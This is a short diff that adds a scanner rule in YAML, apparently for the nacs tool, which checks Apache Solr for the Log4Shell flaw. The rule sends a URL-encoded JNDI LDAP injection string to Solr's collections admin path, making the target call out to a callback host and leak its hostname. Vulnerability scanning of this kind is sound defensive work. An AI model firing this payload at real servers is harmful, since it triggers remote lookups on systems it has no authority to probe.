@@ -1,0 +1,14 @@
+name: apache-solr-log4j-rce
+set:
+  reverse: newReverse()
+  reverseHost: reverse.url.host
+  reverseURL: reverse.url.path
+rules:
+  - method: GET
+    path: /solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.{{reverseHost}}/a%7D
+    expression: |
+      reverse.wait(10)
+detail:
+  author: u21h2
+  links:
+        - https://github.com/u21h2/nacs
